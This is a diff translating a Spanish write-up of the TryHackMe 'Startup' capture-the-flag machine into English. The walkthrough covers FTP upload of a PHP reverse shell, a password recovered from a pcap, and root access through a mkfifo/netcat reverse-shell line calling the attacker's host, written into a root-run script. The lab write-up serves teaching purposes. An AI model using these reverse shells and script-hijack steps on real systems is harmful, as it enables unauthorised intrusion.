@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "☣THM☣ Startup"
+title:  "[THM] Startup"
 date:   2021-05-14 7:21:00 +0200 # Cambiar esto
 last_modified_at: 2021-05-14 07:21:29 +0200 # Cambiar esto
 toc:  true
@@ -8,13 +8,13 @@ tags: [ctf, linux, Tryhackme, Writeup]
 categories: Tryhackme
 ---
 
-{: .message }
+It is a linux machine that allows us to review some basic concepts.
 
-Es una maquina linux que nos permite repasar algunos conceptos basicos.
+---
 
-## Enumeración
+## Enumeration
 ### Nmap
-*Puertos:*
+*Ports:*
 
 * 21/tcp -->  vsftpd 3.0.3
 * 22/tcp --> OpenSSH 7.2p2
@@ -49,7 +49,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 120.35 seconds
 ```
 
-*Escaneo mas exhaustivo:*
+*More exhaustive scanning:*
 ```bash
 # Nmap 7.91 scan initiated Mon May 17 17:39:07 2021 as: nmap -sC -sV -p21,22,80 -oN Scanport2 10.10.120.176
 Nmap scan report for 10.10.120.176
@@ -88,9 +88,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Mon May 17 17:39:26 2021 -- 1 IP address (1 host up) scanned in 19.00 seconds
 ```
 
-### FTP Enumeracion
+### FTP Enumeration
 
-Algo a destacar es los permisos que tenemos en el directorio ftp
+One thing to note is the permissions we have in the ftp directory
+
 
 ```bash
 ftp 10.10.120.176
@@ -115,12 +116,12 @@ ftp>
 
 ### Fuzz
 
-Utilice dirsearch y pude encontrar un directorio que esta todo lo que se encuentra en el ftp:
+I used dirsearch and was able to find a directory that contains everything in the ftp:
 * /files
 
-## Shell Inicial (PHP reverse)
+## Shell Initial (PHP reverse)
 
-La idea es que como ponemos subir archivo y ejecutarlo, subo una reverse de php al ftp para luego visualizarla desde la pagina:
+The idea is that as we put upload file and execute it, I upload a php reverse to the ftp and then visualize it from the page:
 
 ```bash
 ftp> put reverse.php
@@ -131,7 +132,7 @@ local: reverse.php remote: reverse.php
 5494 bytes sent in 0.00 secs (21.5617 MB/s) 
 ```
 
-Cambiamos estos parametros:
+We change these parameters:
 
 ```php
 set_time_limit (0);
@@ -149,7 +150,7 @@ $debug = 0;
 ![](/images_blog/img_startup/Pastedimage20210517170517.png)
 ![Pastedimage20210517170517](https://user-images.githubusercontent.com/76759292/128111109-3fd9331e-4ba6-4c18-b9b0-cd5863d22332.png)
 
-Solo nos podemos al escucha:
+We can only listen:
 
 ```bash
 nc -lvnp 4444
@@ -165,10 +166,10 @@ Script started, file is /dev/null
 www-data@startup:/$ 
 ```
 
-*La primera pregunta se encuentra en la raiz como recipe.txt*
+*The first question is found in the root as recipe.txt*
 
-## Shell como Lennie
-Enumeramos un poco el sistema y encontramos un archivo que se llama *suspicious.pcapng* nos transferimos dicho archivo:
+## Shell as Lennie
+We list the system and find a file called *suspicious.pcapng* and transfer it to us:
 
 ```bash
 www-data@startup:/$ ls
@@ -191,11 +192,11 @@ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-## Analisis del suspicious.pcapng
+## Analysis suspicious.pcapng
 
-Con el comando strings analizamos el archivo:
+With the strings command we parse the file:
 
-Encontramos una password y pruebo a ver si es la del usuario lennie:
+We find a password and I test to see if it is that of the user lennie:
 *c4ntg3t3n0ughsp1c3*
 
 ```bash
@@ -247,9 +248,9 @@ lennie@startup:/$
 /initrd.img.old            
 ```
 
-## Shell como root
+## Shell as root
 
-Existe un script que es ejecutado por root, entonces sabiendo esto solo tenemos que ir:
+There is a script that is executed by root, so knowing this we just have to go:
 
 ```bash
 lennie@startup:~/scripts$ cat planner.sh
@@ -259,7 +260,7 @@ echo $LIST > /home/lennie/scripts/startup_list.txt
 /etc/print.sh
 ```
 
-Modificamos el archivo */etc/print.sh* y ponemos nuestra reverse:
+We modify the */etc/print.sh* file and set our reverse:
 
 ```bash
 #!/bin/bash
@@ -267,7 +268,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.206.201 9999 >/tmp/f
 echo "Done!"
 ```
 
-Nos ponemos a la escucha:
+We are listening:
 
 ```bash
 nc -lvnp 9999
@@ -282,3 +283,7 @@ THM{f963aaa6a430********}
 ```
 
 MACHINE PWNED!!!!!
+
+<p align="center">
+<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="200" height="200" />
+</p>
